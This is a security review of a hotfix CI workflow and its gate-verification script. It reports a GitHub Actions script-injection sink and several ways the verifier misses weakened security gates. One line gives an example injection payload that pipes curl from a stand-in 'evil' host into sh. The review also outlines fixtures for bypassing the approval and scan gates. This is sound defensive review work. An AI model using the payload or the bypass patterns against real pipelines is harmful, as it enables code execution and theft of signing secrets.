# Security review — E12-R34 (post-launch stabilization & hotfix)

- **Review tree:** `/tmp/review-e12-r34` @ `02e4e49a` (diff `54eccb63..02e4e49a`, 8 files, +2019)
- **Risk:** high (round brief §0.0 → `security-reviewer` mandatory)
- **Scope:** READ-ONLY. No production edits, no `gh`, no push/commit.
- **Threat focus:** the hotfix is the fastest path to production — the most likely place "urgency" disables a gate.

## Summary

The shipped `hotfix.proposal.yml` is itself correctly shaped (unconditional scan + signing steps,
single `environment:`, approval-before-build graph). The findings are in (a) the **measure**
(`verify_hotfix.py`) that is supposed to keep those gates in place on future edits — it gives
**false green** to three distinct real weakenings — and (b) a **script-injection sink** the proposal
introduces that the precedents deliberately avoided. No proven secret leak into the repo and no §5
product-boundary breach, so nothing rises to CRITICAL/BLOCKER; but four MAJOR findings falsify the
round's own acceptance guarantees (A2, A6 / ADR 0490 D1, D3).

---

## MAJOR-1 — `${{ inputs.* }}` interpolated into `run:` shell = GitHub Actions script injection

**File:** `docs/release/workflows/hotfix.proposal.yml:82, 85, 86, 164, 188`

**Failure scenario.** `incident_id`, `summary` (and `version`) are free-form `workflow_dispatch`
strings interpolated verbatim into `run:` shell bodies before the shell parses them.

- Line 82/164: `... --incident-id "${{ inputs.incident_id }}" ...`. Dispatch with
  `incident_id = x" ; curl https://evil/x | sh ; "` breaks out of the double quotes →
  arbitrary command execution.
- Line 86: `echo "Summary: ${{ inputs.summary }}"` — `summary` is validated by nothing; same break-out.
- Line 164 runs inside `build-hotfix`, the job whose later steps hold the production signing secrets
  in their `env:` (`ANDROID_KEYSTORE_BASE64`, `ANDROID_STORE_PASSWORD`, …). Checkout (line 149) runs
  *before* the injectable step (line 162), so an injected command can tamper with the workspace that
  the subsequent signing/build step then executes with the secrets in scope → a real secret-exfiltration
  path once installed.

**Reproduction (pattern + precedent divergence):**
```
grep -n '${{ inputs\.' /tmp/review-e12-r34/docs/release/workflows/hotfix.proposal.yml
  → lines 82,85,86,164,188 interpolate inputs into run:
grep -n '${{ inputs\.' /tmp/review-e12-r34/docs/release/workflows/release-candidate.proposal.yml
  → (none)   # the RC precedent takes no inputs and never interpolates into run:
```
`version` (line 188) is incidentally protected because the prior `verify_hotfix.py` version check
rejects any non-`^\d+$` part; `incident_id`/`summary` have no such sanitizer.

**Rule violated:** threat model §2 (`${{ }}` interpolation in shell context = parancsinjekció;
compare to precedent). ADR 0448 secret-hardening intent.

**Fix direction:** never interpolate `inputs.*` into `run:`. Bind them through `env:` and reference
`"$INCIDENT_ID"` / `"$SUMMARY"` (GitHub's documented hardening for untrusted inputs), exactly as the
keystore steps already do for secrets.

---

## MAJOR-2 — the measure is blind to JOB-level `if:` / `continue-on-error:` on the gate jobs

**File:** `tool/release/verify_hotfix.py:321-350` (only iterates `security_steps`/`signing_steps`
step-level fields; never inspects the containing job's fields)

**Failure scenario.** A future edit adds `continue-on-error: true` (or an `if:`) at the **job** level
of `security-scan`. In GitHub Actions a `continue-on-error` job that fails is treated as non-blocking
for downstream `needs:`, so `build-hotfix` proceeds and signs even though the scan failed — the exact
bypass ADR 0490 D1 promises the static cell turns red on. The static check never looks at job-level
fields, so it stays green.

**Reproduction (both give false green):**
```
# A: job-level continue-on-error on security-scan
python3 tool/release/verify_hotfix.py --workflow A_job_continue.yml → "ok" exit=0
# B: job-level if on security-scan
python3 tool/release/verify_hotfix.py --workflow B_job_if.yml       → "ok" exit=0
```
(fixtures = real proposal with `continue-on-error: true` / `if: ${{ … }}` added under
`security-scan:`; both saved under the scratchpad.)

**Rule violated:** ADR 0490 D1 + Consequences ("a verify_hotfix.py statikus cellái pirosra váltanak,
ha a scan/signing … feltételessé válik"). Acceptance A2.

**Fix direction:** after `parse_workflow_jobs`, also reject job-level `if:`/`continue-on-error:` on any
job containing a security-scan or signing step.

---

## MAJOR-3 — the measure checks the step NAME, never that the step actually runs the scan/signing

**File:** `tool/release/verify_hotfix.py:314-350` (matches `step.name` against `security scan`/`sign`;
`step.run` content is never asserted)

**Failure scenario.** A step keeps the name "Release security scan" but its body is replaced with a
no-op (`echo …`), gutting the gate while satisfying the measure. Same applies to the signing step.

**Reproduction (false green):**
```
# D: scan step name unchanged, body swapped to `echo "security scan skipped" > report.json`
python3 tool/release/verify_hotfix.py --workflow D_noop_run.yml → "ok" exit=0
```
The test authors' own mutation fixtures use `run: | echo scan` as the scan body (test lines 268-270,
310-312), confirming the measure by design ignores run content.

**Rule violated:** threat model §3 (does the measure actually catch weakenings, or can a YAML form
slip through). Acceptance A2 (spirit).

**Fix direction:** assert the scan step's run contains `security_scan.py` and the signing step drives
the real signed build (e.g. `STRUMSIGHT_REQUIRE_RELEASE_SIGNING`), not just that a name matches.

---

## MAJOR-4 — D3 approval-gate uses a release-verb DENYLIST; publish/ship/deploy evade it

**File:** `tool/release/verify_hotfix.py:285` (`_RELEASE_VERB = build|sign|assembl|upload`) used at
`:364-375`

**Failure scenario.** A new job that ships the artifact to production but names its steps with a verb
outside the denylist ("Publish", "Ship", "Release", "Deploy", "Distribute") and has no
`uses: *upload*` is not classified as a release-artifact job, so the check never requires it to
`needs:` the approval job. Result: a publish-to-production job with **no approval gate** passes.

**Reproduction (false green):**
```
# E: job "Publish hotfix" → step "Ship hotfix package to store" → run: gh release create …
#    NO needs: approve-hotfix
python3 tool/release/verify_hotfix.py --workflow E_publish_no_approval.yml → "ok" exit=0
```

**Rule violated:** ADR 0490 D3 ("minden … feltöltő job tranzitívan needs-eli a jóváhagyó jobot").
Acceptance A6. Denylist-vs-allowlist pattern.

**Fix direction:** invert to an allowlist — every job other than the single `environment:` job must
transitively `needs:` it (or broaden+anchor the verb set and match `uses:` publish actions), so an
unrecognized job fails closed.

---

## MINOR-1 — version monotonicity treats `1.2` → `1.2.0` as an increment

**File:** `tool/release/verify_hotfix.py:387-410`

`--previous-version 1.2 --version 1.2.0` → exit 0, though the two are semantically the same version
(tuple `(1,2) < (1,2,0)`). Looser than semantic equality for the trailing-zero form; the contract
says "same or stricter, never looser."

**Reproduction:**
```
python3 tool/release/verify_hotfix.py --incident-id x --previous-version 1.2 --version 1.2.0 → exit=0
```
The numeric core is otherwise sound: `1.9.0→1.10.0` passes (not lexical), `v1.2.4` / `1.2.4-hotfix`
fail-closed, empty/whitespace `previous`/`incident` → exit 1.

**Fix direction:** normalize trailing zeros (or require equal segment length) before comparing.

---

## NOTES (non-blocking)

- **NOTE-1 (`verify_hotfix.py` request mode):** monotonicity compares the operator-supplied
  `previous_version`, not the live/pubspec production version — an operator can pass any low
  `previous_version`. Inherent to the manual design; the approval environment is the compensating
  control. Worth a one-line caveat in the runbook.
- **NOTE-2:** leading zeros accepted (`01.02.03` → parses). Cosmetic.
- **NOTE-3 (privacy, clean):** `postmortem-template.md`, `post-launch-day7.md`,
  `post-launch-day14.md` collect only aggregate metrics (crash-free rate, ticket counts, categories,
  affected-user ratio) — no raw audio, camera frames, or PII enter the repo. §5 clean.
- **NOTE-4 (secret hygiene of keystore steps, clean):** keystore materialize/remove copies the RC
  precedent faithfully — `umask 077`, base64 passed via `env:` not argv, no `set -x`, no echo of
  secret values, `rm -f` under `if: always()`. The only secret-adjacent risk is MAJOR-1 above.
- **NOTE-5 (fixtures genuinely fake):** new files contain no real secrets — `<TBD>` placeholders,
  `INC-2026-0001` sample id, keystore via `${{ secrets.* }}`. `check_secrets.dart` gate present.

## What I checked and the evidence

- Gate-bypass in the proposal: read every `if:` / `continue-on-error:` / `needs:` / `environment:` /
  `permissions:` and the full job graph vs. the RC precedent — the *shipped* graph is correct
  (approval → gates+scan → build; one `environment:`). The gaps are in the measure (MAJOR-2/3/4) and
  the injection sink (MAJOR-1).
- Measure evadability: ran `verify_hotfix.py` static mode against four hand-weakened fixtures
  (A/B/D/E) — three genuine weakenings return exit 0 (false green).
- Incident binding / version monotonicity: ran request mode across empty/whitespace ids, decreasing/
  equal/greater versions, numeric-vs-lexical (`1.9→1.10`), prefixes, build metadata, trailing-zero and
  leading-zero forms.
- Secret handling: compared keystore/secret steps line-by-line to `release-candidate.proposal.yml`
  and `.github/workflows/release-apk.yml`.
- Privacy: read all three report/postmortem templates for PII / raw-content fields.

## Verdict rationale

None of the findings is a proven secret leak into the repo or a §5 product-boundary breach, so no
CRITICAL/BLOCKER by the strict table. However, this is a high-risk round whose sole purpose is "the
measure keeps the security/signing gate in place on the fastest path to production," and MAJOR-2/3/4
demonstrate the measure gives false green to three real gate-weakenings (job-level conditionalization,
name-preserving no-op, non-denylisted publish job) — falsifying acceptance A2/A6 and ADR 0490 D1/D3 as
*enforced* guarantees — while MAJOR-1 introduces an inputs-into-`run:` injection sink into the very
workflow that materializes production signing secrets. The primary deliverable does not meet its own
contract; the round should not merge until the measure covers job-level fields, run content, and an
approval allowlist, and the proposal removes the `${{ inputs.* }}`-in-`run:` interpolation.

VERDIKT: FAIL
